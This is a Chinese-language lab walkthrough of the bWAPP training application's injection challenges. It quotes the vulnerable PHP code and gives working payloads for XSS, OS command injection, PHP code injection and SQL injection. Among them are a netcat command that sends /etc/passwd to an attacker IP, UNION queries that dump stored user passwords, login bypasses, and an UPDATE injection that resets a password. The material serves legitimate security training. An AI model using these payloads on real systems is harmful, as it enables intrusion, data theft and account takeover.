---
title: bWAPP Injection 
categories:
- Burpsuite 
---

<!-- more -->
## 0x01 HTML(XSS) Injection- Reflected (GET)

该节功能为获取用户输入参数`firstname` 和 `lastname` 并将参数拼接返回给用户。函数`htmli` 用于进行拼接前的参数验证，具体行为与难度有关

服务端相关核心代码如下

```php
<?php
    if(isset($_GET["firstname"]) && isset($_GET["lastname"]))
    {   
        $firstname = $_GET["firstname"];
        $lastname = $_GET["lastname"];    

        if($firstname == "" or $lastname == "")
        {
            echo "<font color=\"red\">Please enter both fields...</font>";       
        }
        else            
        { 
            echo "Welcome " . htmli($firstname) . " " . htmli($lastname);   
        }
    }

?>
```

### Low

该难度下无任何输入验证，因此用户输入参数直接拼接到返回的html中

例如令 `firstname=<script>alert(1)</script>`， 构造如下payload

```html
http://bwapp/bWAPP/htmli_get.php?firstname=%3Cscript%3Ealert%281%29%3B%3C%2Fscript%3E&lastname=1&form=submit
```

返回的html页面为

```html
Welcome <script>alert(1);</script> 1
```

将直接触发XSS

### Medium

该难度下验证代码为

```php
// Converts only "<" and ">" to HTLM entities    
$input = str_replace("<", "&lt;", $data);
$input = str_replace(">", "&gt;", $input);

// Failure is an option
// Bypasses double encoding attacks   
// <script>alert(0)</script>
// %3Cscript%3Ealert%280%29%3C%2Fscript%3E
// %253Cscript%253Ealert%25280%2529%253C%252Fscript%253E
$input = urldecode($input);

return $input;
```

可见其仅替换了输入中的 **< >** 为相应HTML实体编码，随后又调用urldecode进行解码，因此可以使用二次URL编码（double-encoding）来绕过

例如令` firstname=%3Cscript%3Ealert%280%29%3C%2Fscript%3E`，

服务端收到的输入仍为 `%3Cscript%3Ealert%280%29%3C%2Fscript%3E`，因此绕过了对 < > 的替换，

并进而通过 `urldecode` 解码为 `<script>alert(0)</script>`， 触发XSS

### High

该难度下验证代码为

```php
// htmlspecialchars - converts special characters to HTML entities    
// '&' (ampersand) becomes '&amp;' 
// '"' (double quote) becomes '&quot;' when ENT_NOQUOTES is not set
// "'" (single quote) becomes '&#039;' (or &apos;) only when ENT_QUOTES is set
// '<' (less than) becomes '&lt;'
// '>' (greater than) becomes '&gt;'  

return htmlspecialchars($data, ENT_QUOTES, $encoding);
```

函数`htmlspecialchars` 将所有HTML中的敏感字符（&, ", ', <, >）转换为相应HTML实体编码（需声明 **ENT_QUOTES** 参数来转换单引号

## 0x02 HTML(XSS) Injection - Reflected(POST)

同 Get 型，仅请求方式变化

## 0x03 HTML(XSS) Injection - Reflected (URL)

该页面功能为显示当前页面URL

![img](https://raw.githubusercontent.com/Mouka-Yang/WebPentest/master/screen_shots/企业微信截图_15614695018763.png)

关键代码如下：

```php
switch($_COOKIE["security_level"])
{
    case "0" :

        // $url = "http://" . $_SERVER["HTTP_HOST"] . urldecode($_SERVER["REQUEST_URI"]);
        $url = "http://" . $_SERVER["HTTP_HOST"] . $_SERVER["REQUEST_URI"];               
        break;

    case "1" :

        $url = "<script>document.write(document.URL)</script>";
        break;

    case "2" :

        $url = "http://" . $_SERVER["HTTP_HOST"] . xss_check_3($_SERVER["REQUEST_URI"]);
        break;

    default :

        // $url = "http://" . $_SERVER["HTTP_HOST"] . urldecode($_SERVER["REQUEST_URI"]);
        $url = "http://" . $_SERVER["HTTP_HOST"] . $_SERVER["REQUEST_URI"];               
        break;
}

...
    
<div id="main">

    <h1>HTML Injection - Reflected (URL)</h1>

    <?php echo "<p align=\"left\">Your current URL: <i>" . $url . "</i></p>"; ?>

</div>
```

### Low

该请求服务端返回结果为

```html
<i>http://bwapp/bWAPP/htmli_current_url.php</i>
```

由于直接修改URL会导致URL无法解析，因此只能使用**锚点符 #** （[详情](https://www.w3schools.com/jsref/prop_loc_hash.asp)）。又因为浏览器访问URL时会**忽略锚定符**，因此需要通过代理（BurpSuite）来发送请求。

通过BurpSuite截取正常请求，修改URL字段，构造payload如下

 `http://bwapp/bWAPP/htmli_current_url.php#<script>alert(1)</script>` 

![img](https://raw.githubusercontent.com/Mouka-Yang/WebPentest/master/screen_shots/企业微信截图_156147056822.png)

服务器可以正确解析该URL（htmli_current_url.php）

> $\_SERVER["HTTP_HOST"]    // bwapp/
> $\_SERVER["REQUEST_URI"]    // bWAPP/htmli_current_url.php#\<script>alert(1)\</script>

服务器返回结果为

![img](https://raw.githubusercontent.com/Mouka-Yang/WebPentest/master/screen_shots/企业微信截图_15614706629249.png)

触发XSS

### Medium

该请求服务端返回结果为

![img](https://raw.githubusercontent.com/Mouka-Yang/WebPentest/master/screen_shots/企业微信截图_15614710173718.png)

可见其返回了一段JS代码，在前端调用`document.URL`来获取当前页面URL并显示

> 该方法只有在 **IE浏览器** 中才可绕过。由于**IE浏览器** **默认不会对锚点#后的内容进行URL编码**（**Chrome、Firefox则均会对其编码**），所以在本例中 **#** 后的内容会直接写入 HTML 中。
>

因此直接在浏览器中访问 `http://bwapp/bWAPP/htmli_current_url.php#<script>alert(1)</script>`（通常需要 Ctrl+F5 强制刷新页面）,JS执行结果为

![img](https://raw.githubusercontent.com/Mouka-Yang/WebPentest/master/screen_shots/企业微信截图_156151517222.png)

触发XSS

![img](https://raw.githubusercontent.com/Mouka-Yang/WebPentest/master/screen_shots/企业微信截图_15615152189249.png)

### High

该难度同样是在服务端将HOST与URI进行拼接并返回，与 Low 级别的唯一区别是 **在拼接前对URI部分进行 `htmlspecialchars` 转码（同 0x01 High 难度下的输入验证函数）**，将敏感字符脱敏

```php
function xss_check_3($data, $encoding = "UTF-8")
{

    // htmlspecialchars - converts special characters to HTML entities    
    // '&' (ampersand) becomes '&amp;' 
    // '"' (double quote) becomes '&quot;' when ENT_NOQUOTES is not set
    // "'" (single quote) becomes '&#039;' (or &apos;) only when ENT_QUOTES is set
    // '<' (less than) becomes '&lt;'
    // '>' (greater than) becomes '&gt;'  
    
    return htmlspecialchars($data, ENT_QUOTES, $encoding);
}
```

## 0x04 HTML(XSS) Injection - Stored(Blog)

该节功能为存储用户输入，并将输入记录显示到前端

![img](https://raw.githubusercontent.com/Mouka-Yang/WebPentest/master/screen_shots/企业微信截图_15615161253718.png)

核心代码为

```php
while($row = $recordset->fetch_object())
{
    if($_COOKIE["security_level"] == "1" or $_COOKIE["security_level"] == "2")
    {
?>
        <tr height="40">
            <td align="center"><?php echo $row->id; ?></td>
            <td><?php echo $row->owner; ?></td>
            <td><?php echo $row->date; ?></td>
            <td><?php echo xss_check_3($row->entry); ?></td>
        </tr>
<?php
    }
    else
    {
?>
        <tr height="40">
            <td align="center"><?php echo $row->id; ?></td>
            <td><?php echo $row->owner; ?></td>
            <td><?php echo $row->date; ?></td>
            <td><?php echo $row->entry; ?></td>
        </tr>
```

每次请求中服务器向数据库查询已有记录，并存储在 `$recordset` 中，并按行遍历写入HTML中

### Low

Low 难度下未对 `$row->entry` 进行输入验证

因此直接输入 "\<script\>alert(1)\</script\>" 即可触发XSS

![img](https://raw.githubusercontent.com/Mouka-Yang/WebPentest/master/screen_shots/企业微信截图_15615168933291.png)

### Medium

该难度下对 `$row->entry` 进行了 `htmlspecialchars` 转码

### High

同 Medium

## 0x05 OS Command Injection

![img](https://raw.githubusercontent.com/Mouka-Yang/WebPentest/master/screen_shots/企业微信截图_15615177363170.png)

该节功能为对用户提供的域名进行DNS查询

由于后台可能使用OS命令进行DNS查询，因此考虑OS命令注入

### Low

直接输入 `www.nsa.gov; uname -a` 

查看返回结果为

![img](https://raw.githubusercontent.com/Mouka-Yang/WebPentest/master/screen_shots/企业微信截图_15615181859106.png)

发生OS命令注入

输入 `&> /dev/null; cat /etc/passwd` 获取 /etc/passwd文件内容

![img](https://raw.githubusercontent.com/Mouka-Yang/WebPentest/master/screen_shots/企业微信截图_15615183088682.png)

### Medium

输入 `www.nsa.gov; uname -a`， 发现无返回结果，可能是输入被过滤

输入 `www.nas.gov && uname -a` ，仍无结果

输入 `www.nas.gov | uname -a`  ，触发命令执行

![img](https://raw.githubusercontent.com/Mouka-Yang/WebPentest/master/screen_shots/企业微信截图_15615190514034.png)

输入验证代码为：

```php
function commandi_check_1($data)
{
    $input = str_replace("&", "", $data);
    $input = str_replace(";", "", $input);
    
    return $input;
}
```

可见其仅过滤了 & ;  两种常见的shell字符

### High

输入验证代码为：

```php
function commandi_check_2($data)
{
    return escapeshellcmd($data);
}
```

函数`escapeshellcmd`功能为将字符 `&#;|*?~<>^()[]{}$\,\x0A \xFF`转义 （[详见](https://www.php.net/manual/en/function.escapeshellcmd.php)），用于安全执行包含用户输入的shell命令

### NOTE

使用`escapeshellcmd` 并不能完全防御命令注入，因为某些shell命令的选项中包含了敏感操作，通过操作这些选项同样可以实现命令注入功能。例如

```bash
$command = "--use-compress-program='touch /tmp/exploit' /etc/passwd";
shell_exec('tar -cf'.escapeshellcmd($command));
```

该处使用了`tar` 命令的 `--use-compress-program` 选项执行了命令 `touch /tmp/exploit`

## 0x06 OS Command Injection - Blind

该节功能为用户提供自身IP地址供web服务器进行 ping 操作

![img](https://raw.githubusercontent.com/Mouka-Yang/WebPentest/master/screen_shots/企业微信截图_15615215917043.png)

在攻击机中使用 `tcpdump -i eth0 icmp and icmp[icmptype]=icmp-echo` 命令监听所有Ping请求

![img](https://raw.githubusercontent.com/Mouka-Yang/WebPentest/master/screen_shots/企业微信截图_15615217171421.png)

监听到由 bwapp 发来的 ICMP 包

由于页面本身不显示命令执行结果，因此需要盲注

### Low

浏览器输入 `www.baidu.com; ping -c1 192.168.187.129`，发现在这种情况下攻击机仍收到 Ping包，因此该处存在命令注入

在攻击机终端开启netcat监听端口 `nc -l -p 11111`，监听端口为11111

浏览器输入 `www.baidu.com; nc 192.168.187.129 11111 < /etc/passwd`，导致web服务端将系统文件/etc/passwd发送至攻击机

![img](https://raw.githubusercontent.com/Mouka-Yang/WebPentest/master/screen_shots/企业微信截图_15615263592245.png)

### Medium

同 0x05 相同，该难度下仅替换了输入中的 "& ; "，因此可用 |  替代

构造payload 为 `www.baidu.com | nc 192.168.187.129 11111 < /etc/passwd`

### High

同0x05

## 0x07 PHP Code Injection

该节功能为发送请求至服务端，服务端从查询字符串中获取参数，并调用PHP语句 `echo xxx` 返回结果

核心代码如下

```php
if(isset($_REQUEST["message"]))
{

    // If the security level is not MEDIUM or HIGH
    if($_COOKIE["security_level"] != "1" && $_COOKIE["security_level"] != "2")
    {

?>
    <p><i><?php @eval ("echo " . $_REQUEST["message"] . ";");?></i></p>

<?php

    }

    // If the security level is MEDIUM or HIGH
    else
    {
?>
    <p><i><?php echo htmlspecialchars($_REQUEST["message"], ENT_QUOTES, "UTF-8");;?></i></p>

```

### Low

在该难度下，`message`参数的值直接拼接到 `echo` 命令中，并调用 `@eval` 执行，由于 `echo` 命令可接任意其他命令，因此可以通过修改 `message` 的值实现PHP代码注入

由于没有用户输入，需要BurpSuite拦截请求，并修改`message` 字段为 `shell_exec('cat%20/etc/passwd')` **（注意message字段的值需要进行URL编码）**

![img](https://raw.githubusercontent.com/Mouka-Yang/WebPentest/master/screen_shots/企业微信截图_1561528213653.png)

服务端将执行以下代码

```php
@eval ("echo shell_exec('cat /etc/passwd')");
```

从而将/etc/passwd中内容写入HTML中

![img](https://raw.githubusercontent.com/Mouka-Yang/WebPentest/master/screen_shots/企业微信截图_1561528356471.png)

### Medium

该难度下对`message` 的值使用 `htmlspecialchars` 进行转码，再与`echo` 拼接，使得`message`的值无法作为命令执行

## 0x08 SQL Injection (GET/Search)

该节功能为，搜索相应关键字，检索数据库，返回结果

![img](https://raw.githubusercontent.com/Mouka-Yang/WebPentest/master/screen_shots/企业微信截图_15615306561595.png)

核心代码为

```php
if(isset($_GET["title"]))
{

    $title = $_GET["title"];

    $sql = "SELECT * FROM movies WHERE title LIKE '%" . sqli($title) . "%'";

    $recordset = mysql_query($sql, $link);

    if(!$recordset)
    {

        // die("Error: " . mysql_error());
    }
}
```

### Low

输入 `aa'` 测试，返回结果

![img](https://raw.githubusercontent.com/Mouka-Yang/WebPentest/master/screen_shots/企业微信截图_15615308033277.png)

发现错误信息未过滤，且得知数据库为MySql，且使用了模糊查询语句 %

因此推测服务端查询语句可能为

```php
"select * from movies where name='%".MOVIE_NAME."%'"
```

其中MOVIE_NAME为输入的查询关键字

输入 `' or 1=1; -- `，提取表中全部内容（**注意注释符后的空格**）,修改后查询为

```mysql
select * from movies where name='%' or 1=1; -- %'
```

![img](https://raw.githubusercontent.com/Mouka-Yang/WebPentest/master/screen_shots/企业微信截图_15615313507680.png)

输入`' order by n -- `，n为列号，从1开始递增，当报错时则表明当前表的列数

![img](https://raw.githubusercontent.com/Mouka-Yang/WebPentest/master/screen_shots/企业微信截图_15615329819222.png)

当n为8时报错，说明当前表列数为7

输入`' union all select null, version(), null, null, null, null, null-- `，获取服务器Mysql版本

构造查询为

```mysql
select * from movies where title='' 
union all 
select null, version(), null, null, null, null, null--'
```

![img](https://raw.githubusercontent.com/Mouka-Yang/WebPentest/master/screen_shots/企业微信截图_15615331873590.png)

> 由于表第一列通常为默认列ID，不会出现在结果中，因此将 version() 放在了第二列
>

输入 `' and 1=2 union all select null,table_name,column_name,null,null,null,null from information_schema.columns -- `获取数据库中所有表的列名，构造查询如下

```mysql
select * from movies where title='' and 1=2
union all 
select null,table_name,column_name,null,null,null,null 
	from information_schema.columns --'
```

movies表的列名及顺序如下

![img](https://raw.githubusercontent.com/Mouka-Yang/WebPentest/master/screen_shots/企业微信截图_15615390789780.png)

#### 当输出受限时，获取当前数据库及表信息

若前端输出受限（**假设每次只返回一行**），则无法使用上述方法进行注入查询

##### 获取当前数据库

首先输入`' and 1=2 union all select null, database(),null,null,null,null,null # `，构造查询

```mysql
select * from movies where title='' and 1=2
union all 
select null, database(),null,null,null,null,null #'
```

![1561625359860](C:\Users\jasonzyang\AppData\Roaming\Typora\typora-user-images\1561625359860.png)

##### 获取当前数据库中的所有表

输入

```mysql
' and 1=2 union all select null, group_concat(table_name separator ','),null,null,null,null,null from information_schema.tables where table_schema='bWAPP' #
```

构造查询，使用`group_concat`函数将结果聚合到一行

```mysql
select * from movies where title='' and 1=2
union all 
select null, group_concat(table_name separator ','),null,null,null,null,null 
	from information_schema.tables 
	where table_schema='bWAPP' #'
```



![1561625746658](C:\Users\jasonzyang\AppData\Roaming\Typora\typora-user-images\1561625746658.png)

##### 获取 movies 表的列信息

输入 

```mysql
' and 1=2 union all select null, group_concat(column_name separator ','),null,null,null,null,null from information_schema.columns where table_name='movies' and table_schema='bWAPP' #
```

构造查询

```mysql
select * from movies where title='' and 1=2
union all 
select null, group_concat(column_name separator ','),null,null,null,null,null 
	from information_schema.columns 
	where table_name='movies' and table_schema='bWAPP' #'
```



![1561625985213](C:\Users\jasonzyang\AppData\Roaming\Typora\typora-user-images\1561625985213.png)

> Note：当一行信息过多时，可能出现显示不全的情况，此时不能使用`group_concat`，而需要使用`limit`逐行进行查询，如下所示(offset 后的数字为行数，从0开始）

```mysql
' and 1=2 union all select null,column_name,null,null,null,null,null from information_schema.columns where table_name='movies' and table_schema='bWAPP' limit 1 offset 0 #
```

![1561626126122](C:\Users\jasonzyang\AppData\Roaming\Typora\typora-user-images\1561626126122.png)

##### 获取`users`表的列信息

![1561626768392](C:\Users\jasonzyang\AppData\Roaming\Typora\typora-user-images\1561626768392.png)

##### 获取`users`表中的敏感信息

```sql
' and 1=2 union all select null, login, password, null,null,null,null from bWAPP.users #
```

构造查询

```mysql
select * from movies where title='' and 1=2
union all 
select null, login, password, null,null,null,null from bWAPP.users #'
```

![1561626948976](C:\Users\jasonzyang\AppData\Roaming\Typora\typora-user-images\1561626948976.png)

### Medium

该难度下输入验证为

```php
function sqli_check_1($data)
{
   
    return addslashes($data);
    
}
```

函数`addslashes` 将字符串中的 **' " \ NUL**字符前添加 **\\** 进行转义，防止输入中包含敏感字符

该函数应用与字符集为多字符（GBK，Big5等）的数据库中时可能被绕过，[详见](https://www.itshacked.com/344/bypassing-php-security-addslashes-while-sql-injection-attacks-is-possible.html)

### High

该难度下输入验证为

```php
function sqli_check_2($data)
{
    return mysql_real_escape_string($data);
}
```

函数`mysql_real_escape_string` 与 `addslashes`的最大区别是前者包含了当前数据库连接中的字符集信息，因此安全性高于 `addslashes`

**Note**: `mysql_real_escape_string` 只能防御字符串闭合类的SQLi，对于**数字类型**的注入无法防御

## 0x09 SQL Injection (GET/Select)

该节功能用户在列表中选择相应表项，发送至服务器查询其相关信息并返回结果

![img](https://raw.githubusercontent.com/Mouka-Yang/WebPentest/master/screen_shots/企业微信截图_15615363364780.png)

核心代码为：

### Low

此处无用户输入，只能依靠请求中的查询字符串`movie`进行注入

通过URL `http://bwapp/bWAPP/sqli_2.php?movie=1&action=go` 可知`movie`参数在SQL查询中的类型为数字

因此在BurpSuite中修改查询为`1%20or%201%3D1--%20`

![img](https://raw.githubusercontent.com/Mouka-Yang/WebPentest/master/screen_shots/企业微信截图_1561536724136.png)

结果发现仍只有一行记录，查看源码发现服务端只输出了查询结果的第一条记录

```php
if(mysql_num_rows($recordset) != 0)
{    

    $row = mysql_fetch_array($recordset);        

    // print_r($row);

    ?>

        <tr height="30">

        <td><?php echo $row["title"]; ?></td>
        <td align="center"><?php echo $row["release_year"]; ?></td>
        <td><?php echo $row["main_character"]; ?></td>
        <td align="center"><?php echo $row["genre"]; ?></td>
        <td align="center"><a href="http://www.imdb.com/title/<?php echo $row["imdb"]; ?>" target="_blank">Link</a></td>

        </tr>     
        <?php     

}
```

由于服务端仅返回查询结果的第一条记录，因此需要使正常查询 `movie=n` 不返回记录

例如查询`1 and 1=2 union all select null,version(),null,null,null,null,null order by 1 -- `

因为`select * from movies where movie=1 and 1=2` 无记录，因此只返回了 数据库 version 信息

![img](https://raw.githubusercontent.com/Mouka-Yang/WebPentest/master/screen_shots/企业微信截图_15615383399034.png)

> 也可使用`order by `显示version信息
>

### Medium

该难度下使用`mysql_real_escape_string`来过滤输入，由于该函数无法防御针对数字的注入行为，因此以上payload依然有效

### High

该难度使用参数化查询

## 0x10 SQL Injection (POST/Select/Search)

同Get型，需要代理修改POST参数

## 0x11 SQL Injection (AJAX/JSON/jQuery)

同Get型，需要代理修改AJAX参数

## 0x12 SQL Injection ((Login Form/Hero))

输入 `' or 1=1 --  ` 直接跳过密码验证

## 0x13 SQL Injection (Login Form/User)

输入 ` ' or 1=1 -- `后显示无效验证，说明验证方法发生变化，可能方法是

1. 通过用户名查询存储在数据库中的对应密码的HASH

   `select *from users where username=$username`

   `$pass_hash = $result['password']`

2. 计算用户提供密码的HASH

   `$input_hash = hash(password)`

3. 比较俩HASH是否匹配

   `if ($input_hash == $pass_hash)`

因此若是第一步查询返回的HASH与输入密码的HASH相匹配时，则能绕过登录

首先使用`order by` 方法确定登录表的列数

当输入`a' order by 10 -- ` 时，提示第10列不存在，确定该表为**9列**

![1561602200296](C:\Users\jasonzyang\AppData\Roaming\Typora\typora-user-images\1561602200296.png)

计算输入密码的MD5值（**不一定是MD5 HASH**，还如SHA1，SHA2，SHA256等）

`MD5('pass') = 1a1dc91c907325c69271ddf0c944bc72`

用其覆盖第一步的查询结果，在账号框中输入 (**注意注释符 -- 后需要空格**)

`a' union all select null, "username", "1a1dc91c907325c69271ddf0c944bc72", null,null,null,null,null,null -- `

密码框中输入 `pass`

**仍然提示验证错误**，则可能是HASH函数的问题，**需要更换HASH函数并替换上述查询中的相应部分**，继续测试

当HASH函数为**SHA1**时验证成功，构造查询

```mysql
select *from users where username='a' 
union all 
select null, "username", 					"9d4e1e23bd5b727046a9e3b4b7db57bd8d6ee684",null,null,null,null,null,null --'
```

![1561603377148](C:\Users\jasonzyang\AppData\Roaming\Typora\typora-user-images\1561603377148.png)

> Note：本测试中默认登录表的 `username`是第二列，`password`是第三列，而实际情况可能与此不一致，因此还需要调整 username 和 HASH值的注入顺序。例如若`password`是第四列，则应调整输入为 `... "username", null, "my_hash_value", ...`

## 0x14 SQL Injection - Stored(BLOG)

**（该节的SQL注入点为`INSERT`语句）**

对于该节来说，可能的数据库插入语句为

```mysql
insert into table (owner, data, entry) values ($user, $date, $entry)
```

或

```php
"insert into table (owner, data, entry) values ('".$user."','".$date."','".$entry."')
```

用户唯一可控的输入只有 `$entry`，且`$entry`在插入序列中的顺序未知，假设位于最后一列

1. 输入`aa') #` 测试，提示插入的列不一致，说明entry不是最后一列

![1561620167615](C:\Users\jasonzyang\AppData\Roaming\Typora\typora-user-images\1561620167615.png)

2. 输入`aa', 'test') #`，提示插入成功，**说明entry位于倒数第二列**，这样就可以通过`(select xxx)`的方式随意操纵插入最后一列的值

3. 输入`aa', (select version()) )#`获取数据库版本，构造查询为

```mysql
insert into table (owner, data, entry) values (..., 'aa', (select version())) #'
```

![1561620339229](C:\Users\jasonzyang\AppData\Roaming\Typora\typora-user-images\1561620339229.png)

4. 输入`aa', (select group_concat(schema_name separator ",") from information_schema.schemata))#`

获取所有数据库名，构造查询

```mysql
insert into table (owner, data, entry) values (..., 'aa', 
       (select group_concat(schema_name separator ",") 
        	from information_schema.schemata)
)# '
```

![1561620468740](C:\Users\jasonzyang\AppData\Roaming\Typora\typora-user-images\1561620468740.png)

**Note：由于对于数据库名的查询结果为多行，所以需要`group_concat`函数将多行结果合并到一行**

也可使用 `aa', (select schema_name from information_schema.schemata limit 1 offset 0))#`

每次获取一行记录（ **offset** 后的数字为行数），构造查询

```mysql
insert into table (owner, data, entry) values (...,'aa',
       (select schema_name from information_schema.schemata limit 1 offset 0)
)#'
```

![1561620942789](C:\Users\jasonzyang\AppData\Roaming\Typora\typora-user-images\1561620942789.png)

## 0x15 SQL Injection - Stored(User-Agent)

该节功能为显示当前访问用户的UserAgent及IP地址信息

由于时间及IP地址均不可控，因此只能通过修改请求中的UserAgent来实现注入

使用BurpSuite将请求中的UserAgent修改为随意值，发现会被储存

![1561621437591](C:\Users\jasonzyang\AppData\Roaming\Typora\typora-user-images\1561621437591.png)

同0x14类似，首先确定UA在数据库中的列号（略），此处是倒数第二列，因此可操纵最后一列数据的插入

输入`a', (select version()))#`，得到数据库版本信息，其注入过程与0x14类似

![1561621711112](C:\Users\jasonzyang\AppData\Roaming\Typora\typora-user-images\1561621711112.png)

## 0x16 SQL Injection - Stored(XML)

该节功能为更新用户信息中的`secret`字段，使用AJAX请求（直接BP抓包修改）

**可能**查询语句为

```mysql
"update users
	set secret='".$secret."'
	where username='".$username"'
```

注入点只有$secret

通过0x08可知`users.password`使用了HASH编码，HASH函数为SHA-1

因此可以通过update注入来修改 `users.password`

输入`aa', password='40bd001563085fc35165329ea1ff5c5ecbdbbeef`，（**编码为’123‘的 SHA-1 值，注意最后没有右单引号**）

**构造类似如下查询**

```sql
update users
	set secret='aa', password='40bd001563085fc35165329ea1ff5c5ecbdbbeef'
	where username='bee'
```

其结果修改了登录用户bee的密码为123（默认密码为 bug）

